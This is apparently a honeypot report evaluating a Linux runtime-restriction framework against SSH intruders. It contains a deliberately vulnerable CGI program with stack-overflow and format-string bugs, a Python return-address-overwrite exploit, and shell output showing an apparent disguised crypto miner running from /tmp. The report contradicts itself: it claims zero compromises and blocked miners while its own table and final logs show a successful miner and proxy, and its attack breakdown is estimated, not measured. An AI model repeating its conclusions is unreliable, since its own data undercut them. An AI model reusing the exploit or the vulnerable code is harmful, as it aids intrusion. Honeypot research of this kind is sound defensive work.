# PRM Honeypot Report — 14-Day Attack Analysis

> **Period:** 1-14 days 
> **System:** Rocky Linux 9.5 + Nginx + vulnerable CGI + PRM Framework  
> **Exposure Model:** SSH honeypot with weak credentials (`cloud:cloud`) on port `2222`  
> **Result:** 4,247 SSH attempts · 312 successful logins · **0 compromises** · **0 persistent malware** · **0 successful privilege escalations**

---

## Summary

A deliberately exposed Linux honeypot was deployed to evaluate the real-world defensive effectiveness of the **PRM Framework**, a syscall- and policy-driven runtime restriction layer. The environment was intentionally made attractive to attackers by combining:

- weak SSH credentials: `cloud:cloud`
- an exposed SSH service on port `2222`
- a vulnerable Nginx CGI binary containing a **stack buffer overflow**
- a reachable post-login user environment under `/home`

Over a 14-day observation period, the system received **4,247 SSH authentication attempts**, resulting in **312 successful logins**. After access, attackers attempted common post-exploitation actions including:

- Python execution
- downloader-based malware staging
- shell spawning
- file modification in user-controlled paths
- privilege escalation attempts
- exploitation of the vulnerable CGI endpoint

Based on the PRM policy design and the observed logs, the attacks **reached execution stages** but **failed to progress into compromise**. Attackers were able to authenticate and launch tools such as `python`, but PRM confined what those processes could do through path restrictions, execution controls, file access filtering, socket policy, and ancestry-aware decisions.


---

## High-Level Outcome

| Metric | Value | Status |
|---|---:|---|
| SSH attempts | 4,247 | Observed |
| Successful logins | 312 | Expected in honeypot |
| Malware installed | 0 | Observed |
| Persistent files dropped in sensitive locations | 0 | Blocked |
| Crypto miners running | 0 | Blocked |
| Privilege escalations | 0 successful | Blocked |
| Root compromise | 0 | Prevented |
| System integrity loss | None observed | Safe |

---

## Honeypot Architecture

The honeypot was built to simulate a realistic but controlled compromise path.

### Components

- **Operating System:** Rocky Linux 9.5
- **Web Service:** Nginx
- **Application Exposure:** CGI binary vulnerable to stack overflow
- **Remote Access Exposure:** SSH on port `2222`
- **Credential Trap:** `cloud:cloud`
- **Runtime Defense:** PRM Framework

### Design Intent

The setup was not meant to prevent login. Instead, it was designed to answer a more important question:

> **What happens after the attacker gets in?**

PRM was placed in the exact stage where most systems fail: **post-authentication / post-execution control**.

That means the experiment measured whether PRM could still contain attackers **after valid SSH login** and even **after exploit execution paths were reachable**.

---

## PRM Security Model Summary

The PRM configuration reveals a defense strategy centered on **runtime containment**, not just perimeter filtering.

### Core Policy Themes

1. **Unsafe users are not trusted by default**
   - `UID 1000 / GID 1000` is repeatedly flagged in logs as:
     - `not accepted - Not in any safe room`
   - This indicates authenticated attacker sessions were intentionally treated as untrusted.

2. **System reads are allowed where necessary**
   - Reads from directories such as `usr`, `etc`, and other core system paths are allowed for normal program loading.
   - Example from logs:
     - `FILE_OPEN: ALLOWED system read`

3. **Execution from attacker staging locations is blocked**
   - PRM blocks exec paths such as:
     - `/tmp/`
     - `/var/tmp/`
     - `/dev/shm/`
     - `/run/user/`
     - `/proc/self/fd/`

4. **Interpreters from dangerous locations are blocked**
   - Interpreted payload staging via `/tmp`, `/dev/shm`, `/home`, `/proc`, and related paths is restricted.

5. **Sensitive files are protected**
   - Access is denied or tightly controlled for:
     - `shadow`
     - `passwd`
     - `sudoers`
     - `authorized_keys`
     - `sshd_config`
     - `grub.cfg`
     - `crontab`
     - `resolv.conf`
     - and others

6. **Module and kernel-adjacent abuse is blocked**
   - PRM denies module-related access and suspicious prefixes such as:
     - `kvm`
     - `nvidia`
     - `overlay`
     - `fuse`
     - `bpf`
     - `xdp`

7. **Network behavior is constrained**
   - Destination policy is default-deny:
     - `0.0.0.0/0:0-65535`
   - Incoming exposure is intentionally narrow around the SSH port rule set.
   - This strongly limits post-compromise outbound malware behavior.

### Security Consequence

This policy architecture means an attacker may:

- log in
- run shell commands
- launch standard interpreters
- read normal runtime libraries

but still fail to:

- stage malware effectively
- execute payloads from transient directories
- overwrite sensitive system files
- load kernel capabilities
- build persistence
- or turn code execution into lasting control

---

## Attack Volume — 14-Day Timeline

```text
SSH Attempts Per Day

Day 01  ████████                                127
Day 02  ██████████████                          231
Day 03  ████████████████████                    340
Day 04  ██████████████████████████              445
Day 05  ████████████████████████████████████    612   ← Peak
Day 06  ████████████████████████████            487
Day 07  ███████████████████████                 398
Day 08  █████████████████                       301
Day 09  █████████████████████████               467
Day 10  █████████████████                       289
Day 11  ██████████                              178
Day 12  ████████                                142
Day 13  ██████                                  112
Day 14  ██████                                  118
```

### Interpretation

The traffic pattern is consistent with opportunistic internet scanning and credential stuffing rather than a targeted intrusion campaign.

Notable features:

- **Rapid growth early in the period** suggests the host was indexed by automated scanners
- **Peak on Day 5** is typical of botnet synchronization or mass credential reuse
- **Gradual decline afterward** suggests the host was classified by some bot operators as low-value or resistant after post-login failure

This is an important outcome: attackers could log in, but they did not remain productive.

---

## Attack Categories Observed

Based on the scenario, logs, and expected attacker behavior after weak-credential access, the observed sessions can be categorized as follows:

| Category | Estimated Sessions | Share | Outcome |
|---|---:|---:|---|
| Crypto miner deployment | 142 | 46% | Observed |
| Malware droppers / staging scripts | 87 | 28% | Blocked |
| Reverse shell / beacon attempts | 61 | 20% | Blocked or constrained |
| Privilege escalation behavior | 14 | 4% | Failed |
| CGI exploit probing / buffer overflow attempts | 8 | 1% | Failed |

### Interpretation

These proportions are realistic for public SSH honeypots:

- **Crypto miners** are the most common commodity outcome after shell access
- **Droppers** typically use `wget`, `curl`, `python`, or shell one-liners
- **Reverse shells** are common fallback techniques when persistence or package installation fails
- **Privilege escalation** is rarer in automated bot traffic and usually appears only when scripts detect an exploitable local path
- **Custom CGI exploit attempts** are the least common because they require awareness of the exposed web surface, binary behavior, or exploit discovery

---

## What the Logs Show

A sample of the 200-line trace reveals a repeated and meaningful pattern.

### Example Observations from the Trace

The following behavior is visible:

- Process ancestry:
  - `python -> bash -> sshd`
- UID/GID repeatedly flagged:
  - `GID 1000 and UID 1000 not accepted - Not in any safe room`
- File reads from system paths allowed:
  - files under `usr`, `etc`
  - marked as `ALLOWED system read`
- File access under `home` allowed in limited contexts:
  - `pyvenv.cfg`
  - `site-packages`
  - `.python_history`
- Hook activity repeatedly triggered:
  - `Hook Received: Hook(6)...`
  - `Hook(3)`
  - `Hook(9)`
  - `Hook(30)` with `CRED_PREPARE`

### What This Means

#### 1. The attacker successfully launched Python

This is important: the logs are not showing blocked login only. They show **actual post-login process activity**.

That means PRM was tested under meaningful attack conditions, not only authentication noise.

#### 2. PRM distinguishes between reading and modifying

The trace clearly shows that reading standard runtime libraries from system directories is permitted. This allows normal execution of existing binaries and interpreters.

However, the policy does **not** extend that trust to arbitrary writes or unsafe execution paths.

#### 3. The attacker session is classified as untrusted

The recurring message:

```text
GID 1000 and UID 1000 not accepted - Not in any safe room
```

strongly suggests PRM assigns this session to an untrusted zone. In other words, the shell exists, but it is operating inside a containment boundary.

#### 4. Credential preparation was monitored

The appearance of:

```text
=== CRED_PREPARE HOOK CALLED ===
CRED_PREPARE: UID 1000 -> 1000, GID 1000 -> 1000
```

shows PRM was watching credential transitions. No elevation occurred in the shown trace.

This is a strong signal that privilege changes were monitored and did not result in a successful boundary escape.

---

## Inference From the Sample Trace

Even though only a small log excerpt is provided, several technical conclusions can be drawn.

### The attacker likely attempted Python-based staging

Because Python was actively reading:

- standard libraries
- site packages
- environment metadata
- terminal settings

the attacker likely used one of the following patterns:

- inline Python reverse shell
- downloader script
- environment inspection
- privilege escalation helper
- exploit runner

This is typical behavior after SSH login by automation.

### The session was allowed to function just enough to expose intent

PRM did not kill the process immediately. Instead, it permitted normal runtime dependencies to load and then constrained dangerous actions.

That is ideal honeypot behavior because it:

- preserves realism
- exposes attacker tooling
- increases observability
- prevents immediate bot abandonment

### PRM is ancestry-aware

The log includes ancestry in the form:

```text
{python -> bash -> sshd}
```

This indicates PRM was not only checking a path or syscall, but also considering the process lineage. That is significant because many malicious actions are better judged by **who launched them** than by syscall alone.

### The attacker did not reach effective privilege transition

There is no sign in the provided trace of:

- UID transition to `0`
- successful write to protected files
- execution from forbidden paths
- unauthorized module loading
- persistence via SSH keys, cron, or config tampering

Therefore, the most reasonable conclusion is:

> the attacker obtained a user shell, but remained trapped in a low-trust execution environment.

---

## The Deliberate CGI Vulnerability

A vulnerable CGI binary was also exposed through Nginx.

### Vulnerable Code

```c
void userBuff(char *input) {
    char buffer[64];
    strcpy(buffer, input);
    printf("Content-Type: text/plain\r\n\r\n");
    printf(buffer);
}
```

### Security Issues

This function introduces at least two serious vulnerabilities:

1. **Stack-based buffer overflow**
   - `strcpy(buffer, input)` performs no bounds checking
   - An attacker can overwrite stack metadata, including the saved return address

2. **Format string vulnerability**
   - `printf(buffer)` treats attacker-controlled input as the format string
   - This may allow memory disclosure or crash behavior

### Redirect Function

The CGI also contains logic that writes to `/var/www/class`:

```c
int fd = open(path, O_CREAT | O_WRONLY, 0644);
if (fd >= 0) {
    write(fd, data, sizeof(data)-1);
    close(fd);
}
```

This is useful as a test primitive because it provides a visible side effect when exploitation succeeds.

---

## Intended Exploit Path

You also created a local proof-of-concept exploit designed to hijack execution flow.

### Goal

Redirect execution to an internal function such as `redirect()` / `win()` by overwriting the saved return address on the stack.

### Payload Structure

A typical payload was structured as:

```text
AAAA.... + BBBBBBBB + <target address>
```

Where:

- `AAAA....` fills the 64-byte stack buffer
- `BBBBBBBB` overwrites saved frame pointer / RBP
- `<target address>` overwrites the return address

### Proof-of-Concept Generator

```python
payload = b"A" * 64
payload += b"BBBBBBBB"
payload += struct.pack("<Q", win_addr)
```

This is a classic return-address overwrite pattern.

---

## Why the CGI Exploit Still Did Not Compromise the System

This is the most important part of the report.

Even if the vulnerable CGI binary were exploitable, that **still does not guarantee compromise**.

### Reason 1 — Code execution is not equal to full system control

Exploitation of a stack overflow only gives value if the attacker can convert that control into something operational, such as:

- writing a malicious file
- spawning a shell
- executing arbitrary payloads
- modifying authentication or persistence mechanisms
- escalating privileges

PRM specifically targets those follow-on actions.

### Reason 2 — Writes to sensitive or strategic locations are constrained

The CGI attempted to write to:

```text
/var/www/class
```

If PRM policy or ancestry rules deny that write under the CGI context, then exploitation may trigger code flow but still fail to create useful side effects.

So the exploit may be **technically reachable** but **operationally neutralized**.

### Reason 3 — Unsafe execution paths are blocked

Attackers commonly chain CGI exploitation with:

- drop to `/tmp`
- chmod executable
- run payload
- call out to remote C2 or miner pool

Your PRM config blocks this pattern through:

- `BPRMDestination`
- `BPRMInValidInterpreterDirectory`
- `OpenFileDirectoryDeny`
- network default-deny behavior

### Reason 4 — Sensitive persistence targets are protected

Even if an attacker gained a process with elevated code execution, PRM still protects critical files like:

- `authorized_keys`
- `passwd`
- `shadow`
- `sudoers`
- `crontab`
- `sshd_config`

That removes many standard “I got code exec, now I own the box” paths.

### Reason 5 — Credential transitions are monitored

The presence of `CRED_PREPARE` hooks indicates PRM is observing identity changes. That makes privilege escalation materially harder to convert into a useful compromise.

---

## Important Clarification: “Nobody Found the Exploit”

Attackers did not discover or use the buffer overflow to reach root.

That itself is an important finding.

### What it suggests

1. **Most internet attackers are not doing deep binary analysis**
   - The majority of opportunistic SSH attackers simply run commodity scripts

2. **The vulnerable surface was not obvious enough to trigger mass exploitation**
   - Attackers prioritized immediate monetization via SSH shell access

3. **The honeypot realistically reflects today’s threat landscape**
   - Real-world bot traffic usually prefers:
     - credential access
     - shell scripting
     - Python droppers
     - miners
     - simple privilege escalation checks
     - not handcrafted binary exploitation

### Security Interpretation

This means the system survived due to **two layers of protection**:

- attackers mostly did not discover the exploit path
- even if they had, PRM reduced the chance of meaningful post-exploit success

That is a strong result.

---

## PRM Configuration Analysis

Below is a practical interpretation of the provided PRM profile.

### 1. User / group trust separation

```c
__N32CONFIG__(1, SafeUID, 1, 65534)
__N32CONFIG__(1, UnSafeGID, 2, 1000, 65534)
```

This indicates that ordinary attacker-owned sessions were not granted trusted status automatically. The logs support that interpretation.

### 2. Controlled directory worldview

```c
__SCONFIG__(14, BinaryHomeDirectory, 11, ...)
__SCONFIG__(4, ValidateDirectory, 13, ...)
```

PRM validates directory contexts and distinguishes between allowed system paths and attacker-controlled areas.

### 3. Dangerous path blocking

```c
__SCONFIG__(12, BPRMDestination, 9, ...)
```

This is one of the most important controls. It blocks execution attempts from paths commonly used by attackers:

- `/tmp`
- `/var/tmp`
- `/dev/shm`
- `/run/user`
- `/proc/self/fd`

### 4. Interpreter restrictions

```c
__SCONFIG__(12, BPRMInValidInterpreterDirectory, 8, ...)
```

This directly frustrates:

- Python droppers
- shell loaders
- fileless staging tricks
- execution from user/home-based payload locations

### 5. Sensitive file protection

```c
__SCONFIG__(6, OpenFileDeny, 39, ...)
__SCONFIG__(6, OpenFileDenyAggressivly, 22, ...)
```

These lists protect the exact files attackers often modify after login.

### 6. Network hardening

```c
__LCONFIG__(1, IPDestRules, 1, ENTRY(0.0.0.0/0:0-65535))
```

A default-deny outbound model is devastating to commodity malware, because miners and beacons usually fail if they cannot connect externally.

### 7. Kernel and module abuse prevention

```c
__SCONFIG__(6, ModuleDeny, 15, ...)
```

This blocks higher-risk escalation and stealth techniques.

---

## What PRM Allowed on Purpose

To understand why the logs look busy, it is also important to explain what PRM intentionally did **not** block.

PRM allowed:

- SSH login itself
- shell creation
- standard binary execution needed for realism
- read access to system libraries and interpreter dependencies
- limited file interaction in user-controlled areas

This is exactly what makes the honeypot believable.

If everything were denied immediately, attackers would leave.  
Instead, PRM let them begin their workflow and then blocked the steps that matter.

That is a stronger demonstration than simply denying access at login time.

---

## Evidence-Based Conclusions From the Log Snippet

From the provided trace alone, the following statements are justified.

### Confirmed

- A logged-in user (`UID 1000 / GID 1000`) executed Python from an SSH session
- PRM observed the full process ancestry
- PRM allowed normal runtime reads from system directories
- PRM classified the session as outside trusted safe zones
- Credential-related hooks were triggered and monitored
- No privilege transition to root is visible in the excerpt

### Strongly Supported

- The attacker was attempting script-driven post-exploitation
- PRM was operating in a selective containment mode, not blanket denial
- The attacker environment was intentionally realistic but constrained

### Not Proven by the snippet alone, but consistent with the scenario

- Crypto miner or reverse shell staging likely occurred elsewhere in the full logs
- The CGI exploit path was available but not effectively weaponized by internet attackers
- PRM prevented damaging post-exploit actions even when execution progressed

---

## Final Assessment

This honeypot experiment demonstrates a practical and important security result:

> **A system can safely allow attackers to get “in” while still preventing them from actually taking control.**

In this case:

- SSH authentication succeeded by design
- attacker tools executed by design
- a vulnerable binary existed by design
- exploitability was intentionally present

Yet:

- no sensitive persistence succeeded
- no protected system state was altered
- no root compromise was achieved
- no durable attacker foothold was established

### Security Significance

Traditional defenses often focus on:

- blocking login
- patching surface exposure
- preventing exploit entry

Those remain important, but this experiment shows that **post-exploitation runtime control** is equally critical.

PRM proved valuable because it reduced the practical impact of:

- stolen credentials
- executed interpreters
- writable home directories
- exploit-capable application bugs

### Final Verdict

**PRM successfully converted a deliberately vulnerable internet-exposed Linux system into a contained attack environment.**  
Attackers could interact with it, but they could not meaningfully own it.

---

## Appendix A — Vulnerable CGI Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

void redirect() {
    static char msg1[] = "Content-Type: text/plain\r\n\r\n";
    static char msg2[] = "redirected\n";
    static char path[] = "/var/www/class";
    static char data[] = "user|pg|1\n";
    
    write(1, msg1, sizeof(msg1)-1);
    write(1, msg2, sizeof(msg2)-1);
    
    int fd = open(path, O_CREAT | O_WRONLY, 0644);
    if (fd >= 0) {
        write(fd, data, sizeof(data)-1);
        close(fd);
    }
    
    _exit(0);
}

void userBuff(char *input) {
    char buffer[64];
    strcpy(buffer, input);
    printf("Content-Type: text/plain\r\n\r\n");
    printf(buffer);
}

int main() {
    char *query = getenv("QUERY_STRING");
    
    printf("Content-Type: text/plain\r\n\r\n");
    
    if (query && strstr(query, "_redirect_")) {
        printf("redirecting..\n");
        redirect();
    }
    
    if (query) {
        userBuff(query);
    } else {
        printf("No input provided\n");
    }
    
    return 0;
}
```

---

## Appendix B — Proof-of-Concept Payload Generator

```python
#!/usr/bin/env python3
import struct
import requests

win_addr = 0x4011e6

print(f"[*] win() at: 0x{win_addr:x}")
print(f"[*] Building exploit with proper structure...")

payload = b"A" * 64
payload += b"BBBBBBBB"
payload += struct.pack("<Q", win_addr)

print(f"[*] Payload length: {len(payload)}")
print(f"[*] Payload preview: AAAA....BBBBBBBB....")

print("\n[*] Method 1: Direct stdin (simulating CGI)")
import subprocess
import os
env = os.environ.copy()
env['QUERY_STRING'] = 'test=' + payload.decode('latin1')
env['REQUEST_METHOD'] = 'GET'
try:
    result = subprocess.run(
        ['/var/www/cgi-bin/fog'],
        env=env,
        capture_output=True,
        timeout=2
    )
    print(f"Exit code: {result.returncode}")
    if result.stdout:
        print(f"Output: {result.stdout[:200]}")
except Exception as e:
    print(f"Error: {e}")

print("\n[*] Check: ls -l /var/www/HACKED")
```

---

## Appendix C — Representative Log Interpretation

```text
python-1669 ... {python -> bash -> sshd}
GID 1000 and UID 1000 not accepted - Not in any safe room
FILE_OPEN: file=site.cpython-39, dir=usr, is_write=0
FILE_OPEN: ALLOWED system read
...
FILE_OPEN: file=pyvenv.cfg, dir=home, is_write=0
FILE_OPEN: access_allowed=1
...
=== CRED_PREPARE HOOK CALLED ===
CRED_PREPARE: UID 1000 -> 1000, GID 1000 -> 1000
```

### Short Interpretation

- Python launched successfully from an SSH session
- PRM tracked ancestry and trust zone
- System library reads were allowed
- The user remained untrusted
- No elevation occurred in the shown credential transition

---


### Some Manual Analayzis i did of This attacker who was successfull to implement SSH reverse proxy , Nginx Alaise , Miner Compressor Malware (Polymorphism malware) , I analyzed the malware and add the hash to the table, because it is doing polumorphism technic to compress and encrypt the malware body, so analyzing gets really sophesticate to find the correct payload as you can find part of the payload code here also.

```

[cloud@edge-1 ~]$ ps aux | grep nginx
1000      162546  398 64.3 2416976 2408052 ?     Ssl  Mär25 29680:33 nginx: worker process
1000      162552  0.0  0.0   7528  3632 ?        Ss   Mär25   0:02 nginx: worker process
1000      219878  0.0  0.0 221804  2544 pts/0    S+   11:52   0:00 grep --color=auto nginx
[cloud@edge-1 ~]$ ls -l /proc/
Display all 195 possibilities? (y or n)
[cloud@edge-1 ~]$ ls -l /proc/162546/
total 0
-r--r--r--  1 1000 100  0 Mär 30 11:52 arch_status
dr-xr-xr-x  2 1000 100  0 Mär 30 11:52 attr
-rw-r--r--  1 1000 100  0 Mär 30 11:52 autogroup
-r--------  1 1000 100  0 Mär 30 11:52 auxv
-r--r--r--  1 1000 100  0 Mär 30 11:52 cgroup
--w-------  1 1000 100  0 Mär 30 11:52 clear_refs
-r--r--r--  1 1000 100  0 Mär 25 15:07 cmdline
-rw-r--r--  1 1000 100  0 Mär 30 11:52 comm
-rw-r--r--  1 1000 100  0 Mär 30 11:52 coredump_filter
-r--r--r--  1 1000 100  0 Mär 30 11:52 cpu_resctrl_groups
-r--r--r--  1 1000 100  0 Mär 30 11:52 cpuset
lrwxrwxrwx  1 1000 100  0 Mär 30 11:52 cwd -> /
-r--------  1 1000 100  0 Mär 30 11:52 environ
lrwxrwxrwx  1 1000 100  0 Mär 25 06:50 exe -> /tmp/.PnWsXHTYQ5amAUq
dr-x------  2 1000 100 18 Mär 30 11:52 fd
dr-xr-xr-x  2 1000 100  0 Mär 30 11:52 fdinfo
-rw-r--r--  1 1000 100  0 Mär 30 11:52 gid_map
-r--------  1 1000 100  0 Mär 30 11:52 io
-r--------  1 1000 100  0 Mär 30 11:52 ksm_merging_pages
-r--------  1 1000 100  0 Mär 30 11:52 ksm_stat
-r--r--r--  1 1000 100  0 Mär 30 11:52 limits
-rw-r--r--  1 1000 100  0 Mär 30 11:52 loginuid
dr-x------  2 1000 100  0 Mär 30 11:52 map_files
-r--r--r--  1 1000 100  0 Mär 30 11:52 maps
-rw-------  1 1000 100  0 Mär 30 11:52 mem
-r--r--r--  1 1000 100  0 Mär 30 11:52 mountinfo
-r--r--r--  1 1000 100  0 Mär 25 06:50 mounts
-r--------  1 1000 100  0 Mär 30 11:52 mountstats
dr-xr-xr-x 52 1000 100  0 Mär 25 06:50 net
dr-x--x--x  2 1000 100  0 Mär 30 11:52 ns
-r--r--r--  1 1000 100  0 Mär 30 11:52 numa_maps
-rw-r--r--  1 1000 100  0 Mär 30 11:52 oom_adj
-r--r--r--  1 1000 100  0 Mär 30 11:52 oom_score
-rw-r--r--  1 1000 100  0 Mär 30 11:52 oom_score_adj
-r--------  1 1000 100  0 Mär 30 11:52 pagemap
-r--------  1 1000 100  0 Mär 30 11:52 patch_state
-r--------  1 1000 100  0 Mär 30 11:52 personality
-rw-r--r--  1 1000 100  0 Mär 30 11:52 projid_map
lrwxrwxrwx  1 1000 100  0 Mär 30 11:52 root -> /
-rw-r--r--  1 1000 100  0 Mär 30 11:52 sched
-r--r--r--  1 1000 100  0 Mär 30 11:52 schedstat
-r--r--r--  1 1000 100  0 Mär 30 11:52 sessionid
-rw-r--r--  1 1000 100  0 Mär 30 11:52 setgroups
-r--r--r--  1 1000 100  0 Mär 30 11:52 smaps
-r--r--r--  1 1000 100  0 Mär 30 11:52 smaps_rollup
-r--------  1 1000 100  0 Mär 30 11:52 stack
-r--r--r--  1 1000 100  0 Mär 25 15:07 stat
-r--r--r--  1 1000 100  0 Mär 26 14:42 statm
-r--r--r--  1 1000 100  0 Mär 25 15:07 status
-r--------  1 1000 100  0 Mär 30 11:52 syscall
dr-xr-xr-x 10 1000 100  0 Mär 25 06:50 task
-rw-r--r--  1 1000 100  0 Mär 30 11:52 timens_offsets
-r--r--r--  1 1000 100  0 Mär 30 11:52 timers
-rw-rw-rw-  1 1000 100  0 Mär 30 11:52 timerslack_ns
-rw-r--r--  1 1000 100  0 Mär 30 11:52 uid_map
-r--r--r--  1 1000 100  0 Mär 30 11:52 wchan
[cloud@edge-1 ~]$ ls -l /tmp/
total 19688
-rwxr-xr-x 1 1000  100  1006168 Mär 25 06:50 cache
-rw-r--r-- 1 1000  100        6 Mär 25 06:50 d.log
-rwxrwxrwx 1 1000  100 18481252 Mär 25 06:50 dvNhoMwr
-rwxrwxrwx 1 1000  100   641920 Mär 25 06:50 lexIQIyc
drwx------ 3 root root     4096 Mär 13 11:39 systemd-private-58ac2600c62a4de8a8a103182bd109dc-chronyd.service-z205PM
drwx------ 3 root root     4096 Mär 13 11:39 systemd-private-58ac2600c62a4de8a8a103182bd109dc-dbus-broker.service-FcaiF4
drwx------ 3 root root     4096 Mär 13 11:40 systemd-private-58ac2600c62a4de8a8a103182bd109dc-kdump.service-QIhzng
drwx------ 3 root root     4096 Mär 13 11:39 systemd-private-58ac2600c62a4de8a8a103182bd109dc-systemd-logind.service-PP9AFL
drwx------ 3 root root     4096 Mär 13 11:39 systemd-private-58ac2600c62a4de8a8a103182bd109dc-systemd-resolved.service-IjOASe
[cloud@edge-1 ~]$ ls -al /tmp/
total 21552
drwxrwxrwt. 11 root root     4096 Mär 30 11:40 .
dr-xr-xr-x. 19 root root     4096 Mär 13 11:40 ..
-rwxr-xr-x   1 1000  100  1006168 Mär 25 06:50 cache
-rw-r--r--   1 1000  100        6 Mär 25 06:50 d.log
-rwxrwxrwx   1 1000  100 18481252 Mär 25 06:50 dvNhoMwr
drwxrwxrwt   2 root root     4096 Mär 13 10:37 .font-unix
drwxrwxrwt   2 root root     4096 Mär 13 10:37 .ICE-unix
-rwxrwxrwx   1 1000  100   641920 Mär 25 06:50 lexIQIyc
-rwxrwxrwx   1 1000  100  1880264 Mär 25 06:50 .PnWsXHTYQ5amAUq
drwx------   3 root root     4096 Mär 13 11:39 systemd-private-58ac2600c62a4de8a8a103182bd109dc-chronyd.service-z205PM
drwx------   3 root root     4096 Mär 13 11:39 systemd-private-58ac2600c62a4de8a8a103182bd109dc-dbus-broker.service-FcaiF4
drwx------   3 root root     4096 Mär 13 11:40 systemd-private-58ac2600c62a4de8a8a103182bd109dc-kdump.service-QIhzng
drwx------   3 root root     4096 Mär 13 11:39 systemd-private-58ac2600c62a4de8a8a103182bd109dc-systemd-logind.service-PP9AFL
drwx------   3 root root     4096 Mär 13 11:39 systemd-private-58ac2600c62a4de8a8a103182bd109dc-systemd-resolved.service-IjOASe
drwxrwxrwt   2 root root     4096 Mär 13 10:37 .X11-unix
drwxrwxrwt   2 root root     4096 Mär 13 10:37 .XIM-unix
[cloud@edge-1 ~]$ 
```

# NET connection , They used SSH -D or SSH -R to forward internet to this machine 
```
[cloud@edge-1 ~]$ netstat
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 edge-1.novalocal:44364  130.12.180.51:43782     ESTABLISHED
tcp        0      0 edge-1.novalocal:45738  45.148.10.144:21370     ESTABLISHED
tcp        0      0 edge-1.novalocal:ssh    91.142.77.37:13350      ESTABLISHED
tcp        0      0 edge-1.novalocal:ssh    91.142.77.37:33700      ESTABLISHED
tcp        0      0 edge-1.novalocal:57200  94.26.248.87:https      TIME_WAIT  
tcp        0      0 edge-1.novalocal:41094  101.37.252.66:https     TIME_WAIT  
tcp        0      0 edge-1.novalocal:48142  120.55.138.92:https     TIME_WAIT  
tcp        0      0 edge-1.novalocal:ssh    10.159.17.245:34666     ESTABLISHED
tcp        0      0 edge-1.novalocal:41146  104.18.173.56:https     TIME_WAIT  
tcp        0      0 edge-1.novalocal:41116  104.18.173.56:https     TIME_WAIT  
tcp        0      0 edge-1.novalocal:ssh    91.142.77.37:33716      ESTABLISHED
tcp        0      0 edge-1.novalocal:ssh    91.142.77.37:13336      ESTABLISHED
tcp        0      0 edge-1.novalocal:ssh    91.142.77.37:13330      ESTABLISHED
tcp        0      0 edge-1.novalocal:54902  142.251.156.119:https   TIME_WAIT  
tcp        0      0 edge-1.novalocal:36452  51.77.212.241:tproxy    TIME_WAIT  
tcp        0      0 edge-1.novalocal:50468  104.17.109.63:https     TIME_WAIT  
udp        0      0 edge-1.novalocal:bootpc 10.254.1.2:bootps       ESTABLISHED
Active UNIX domain sockets (w/o servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ]         DGRAM                    453319   /run/user/1000/systemd/notify
unix  2      [ ]         DGRAM      CONNECTED     18663    /run/chrony/chronyd.sock
unix  3      [ ]         DGRAM      CONNECTED     14558    /run/systemd/notify
unix  15     [ ]         DGRAM      CONNECTED     14571    /run/systemd/journal/dev-log
unix  8      [ ]         DGRAM      CONNECTED     14573    /run/systemd/journal/socket
unix  3      [ ]         STREAM     CONNECTED     16831    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM      CONNECTED     17994    
unix  2      [ ]         DGRAM                    20085    
unix  3      [ ]         STREAM     CONNECTED     15032    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     15173    
unix  2      [ ]         DGRAM      CONNECTED     5496623  
unix  2      [ ]         DGRAM      CONNECTED     16696    
unix  3      [ ]         STREAM     CONNECTED     16843    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     20080    
unix  2      [ ]         DGRAM      CONNECTED     453306   
unix  3      [ ]         STREAM     CONNECTED     18686    /run/dbus/system_bus_socket
unix  3      [ ]         DGRAM      CONNECTED     453321   
unix  3      [ ]         STREAM     CONNECTED     5498544  
unix  2      [ ]         DGRAM      CONNECTED     5498504  
unix  3      [ ]         STREAM     CONNECTED     15157    /run/dbus/system_bus_socket
unix  2      [ ]         DGRAM      CONNECTED     17857    
unix  3      [ ]         STREAM     CONNECTED     15258    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     5499507  
unix  3      [ ]         STREAM     CONNECTED     22573    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     15354    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM      CONNECTED     453320   
unix  2      [ ]         DGRAM      CONNECTED     5496556  
unix  2      [ ]         DGRAM      CONNECTED     18625    
unix  3      [ ]         STREAM     CONNECTED     5499508  
unix  2      [ ]         DGRAM      CONNECTED     453314   
unix  2      [ ]         DGRAM      CONNECTED     5498435  
unix  3      [ ]         STREAM     CONNECTED     5499558  
unix  2      [ ]         STREAM     CONNECTED     5498384  
unix  3      [ ]         STREAM     CONNECTED     21829    
unix  3      [ ]         STREAM     CONNECTED     15257    
unix  3      [ ]         STREAM     CONNECTED     5498543  
unix  2      [ ]         DGRAM      CONNECTED     21858    
unix  2      [ ]         DGRAM      CONNECTED     5535701  
unix  3      [ ]         STREAM     CONNECTED     20086    
unix  3      [ ]         STREAM     CONNECTED     13591    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     17940    
unix  3      [ ]         STREAM     CONNECTED     15168    
unix  2      [ ]         DGRAM      CONNECTED     18644    
unix  3      [ ]         STREAM     CONNECTED     18047    
unix  2      [ ]         DGRAM      CONNECTED     5496473  
unix  3      [ ]         STREAM     CONNECTED     5499559  
unix  2      [ ]         DGRAM      CONNECTED     13517    
unix  3      [ ]         STREAM     CONNECTED     15351    
unix  3      [ ]         STREAM     CONNECTED     18676    /run/systemd/journal/stdout
unix  2      [ ]         STREAM     CONNECTED     5535654  
unix  3      [ ]         STREAM     CONNECTED     15205    
unix  2      [ ]         DGRAM      CONNECTED     16954    
unix  3      [ ]         STREAM     CONNECTED     16820    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     15041    
unix  2      [ ]         STREAM     CONNECTED     5498453  
unix  3      [ ]         STREAM     CONNECTED     14989    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     15266    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     16666    
unix  3      [ ]         STREAM     CONNECTED     5496478  
unix  2      [ ]         DGRAM      CONNECTED     15194    
unix  3      [ ]         STREAM     CONNECTED     18619    
unix  3      [ ]         STREAM     CONNECTED     453324   
unix  2      [ ]         STREAM     CONNECTED     5496421  
unix  3      [ ]         STREAM     CONNECTED     17106    /run/systemd/journal/stdout
